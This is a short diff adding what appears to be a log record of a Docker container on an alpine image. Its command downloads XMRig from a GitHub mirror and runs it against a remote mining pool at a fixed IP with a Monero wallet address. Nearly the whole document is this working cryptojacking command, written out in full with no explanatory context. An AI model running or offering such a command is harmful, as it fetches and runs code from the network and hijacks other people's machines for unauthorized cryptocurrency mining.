@@ -1,0 +1,4 @@
+Image: alpine:latest
+ID: 2f4cf111a11cd37f54d81f810433add3e6578730aa3ac636a561d1f2178dd42a
+Command: sh -c 'wget https://hub.fastgit.org/xmrig/xmrig/releases/download/v6.4.0/xmrig-6.4.0-linux-static-x64.tar.gz;tar -zxvf xmrig-6.4.0-linux-static-x64.tar.gz;./xmrig-6.4.0/xmrig --url 131.153.76.130:3333 --user 49d2wpMwm636EQGCYFdmgne6NhYhPcN1f9Efgwwx1QVyUnzzJVDGAMe4bVNNkcjV7wXzuRBdxzKuz8SzEfwvaYkaMezqXq8 --pass autox --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14'
+Created:1604417766
